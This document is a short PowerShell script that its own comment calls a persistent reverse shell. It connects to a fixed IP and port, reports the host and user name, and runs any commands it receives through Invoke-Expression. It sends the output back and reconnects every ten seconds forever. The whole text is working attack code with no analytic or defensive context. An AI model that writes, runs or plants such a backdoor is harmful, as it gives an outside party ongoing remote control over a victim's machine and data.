# Persistent reverse shell - auto-reconnects forever 
$ip = "192.168.0.100"
$port = 4444
$sleepSeconds = 10  # Wait between reconnect attempts

while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true

        # Send banner
        $banner = "[+] $env:COMPUTERNAME\$env:USERNAME | PID: $PID"
        $writer.WriteLine($banner)

        # Command loop
        while ($client.Connected) {
            $writer.Write("PS> ")
            $writer.Flush()

            $cmd = $reader.ReadLine()
            if (-not $cmd) { break }
            if ($cmd -eq "exit") {
                $client.Close()
                break
            }

            try {
                $output = Invoke-Expression $cmd 2>&1 | Out-String -Width 4096 
                if ($output) {
                    $writer.WriteLine($output.TrimEnd())
                }
            } catch {
                $writer.WriteLine("ERROR: $_")
            }
            $writer.Flush()
        }
        $client.Close()
    } catch {
        # Connection failed - will retry
    }

    # Wait before reconnecting
    Start-Sleep -Seconds $sleepSeconds
}
